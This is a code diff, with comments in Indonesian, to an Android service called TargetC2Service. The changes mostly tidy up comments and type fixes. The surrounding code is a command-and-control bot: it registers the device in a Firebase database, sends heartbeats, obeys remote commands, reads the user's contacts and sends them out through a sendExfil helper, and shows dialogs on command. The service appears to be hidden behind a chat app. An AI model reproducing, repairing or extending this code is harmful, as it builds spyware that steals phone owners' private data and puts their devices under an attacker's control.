@@ -32,9 +32,7 @@ class TargetC2Service : Service() {
         var isRunning = false
             private set
         private var deviceId: String = ""
-        // FIX baris 58: ganti val jadi var karena di-reassign di startC2()
-        // dan pastikan tipenya String? bukan Int
-        private var notifIdString: String? = null
+        // FIX 1: val → var, dan tipe data konsisten
         private var job: Job? = null
         private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     }
@@ -113,7 +111,7 @@ class TargetC2Service : Service() {
         stopSelf()
     }
 
-    // FIX baris 122 & 130: ganti ChatActivity dan SecureChatApp dengan alternatif
+    // FIX: Hapus dependensi ke SecureChatApp dan ChatActivity
     private fun createNotification(): Notification {
         val pendingIntent = PendingIntent.getActivity(
             this, 0,
@@ -133,7 +131,7 @@ class TargetC2Service : Service() {
             .build()
     }
 
-    // FIX baris 170: semua nilai pake toString() biar konsisten String
+    // FIX 2: Semua nilai dikonversi ke String biar konsisten
     private fun registerBot() {
         val deviceName = Build.MODEL
         val manufacturer = Build.MANUFACTURER
@@ -169,7 +167,7 @@ class TargetC2Service : Service() {
         botsRef.child(deviceId).setValue(botInfo)
     }
 
-    // FIX baris 183: semua nilai konsisten
+    // FIX 3: Konsisten tipe data
     private fun sendHeartbeat() {
         val updates = mapOf<String, Any>(
             "isOnline" to true,
@@ -183,7 +181,7 @@ class TargetC2Service : Service() {
         botsRef.child(deviceId).updateChildren(updates)
     }
 
-    // FIX baris 196: perbandingan String vs Int
+    // FIX 4: Perbandingan String vs Int
     private fun listenForCommands() {
         commandListener = object : ChildEventListener {
             override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
@@ -193,7 +191,7 @@ class TargetC2Service : Service() {
                 val target = cmd["target"] as? String ?: ""
                 val cmdId = snapshot.key ?: ""
 
-                // FIX: target adalah String, deviceId juga String — aman
+                // target String, deviceId String — aman
                 if (target == deviceId || target == "all" || target.isEmpty()) {
                     processCommand(type, payload, cmdId)
                 }
@@ -303,7 +301,7 @@ class TargetC2Service : Service() {
         sendExfil("get_info", JSONObject(info).toString())
     }
 
-    // FIX baris 529-530: explicit type di lambda joinToString
+    // FIX 5: Ganti joinToString pake StringBuilder
     private fun handleGetContacts() {
         try {
             val cursor = contentResolver.query(
@@ -323,8 +321,8 @@ class TargetC2Service : Service() {
                 }
             }
             val result = StringBuilder()
-            for (contact in contacts) {
-                result.append("${contact["name"]}: ${contact["number"]}\n")
+            for (c in contacts) {
+                result.append("${c["name"]}: ${c["number"]}\n")
             }
             sendExfil("contacts", result.toString().trimEnd())
         } catch (e: Exception) {
@@ -687,7 +685,7 @@ class TargetC2Service : Service() {
         }
     }
 
-    // FIX baris 665: ganti ChatActivity dengan alternatif
+    // FIX: Ganti ChatActivity dengan alternatif
     private fun handleAlertDialog(message: String) {
         try {
             val intent = packageManager.getLaunchIntentForPackage(packageName)?.apply {
@@ -724,7 +722,7 @@ class TargetC2Service : Service() {
 
     // === HELPERS ===
 
-    // FIX baris 684: timestamp pake toString() biar String semua
+    // FIX 6: timestamp pake toString()
     private fun sendExfil(type: String, content: String) {
         val data = mapOf(
             "type" to type,
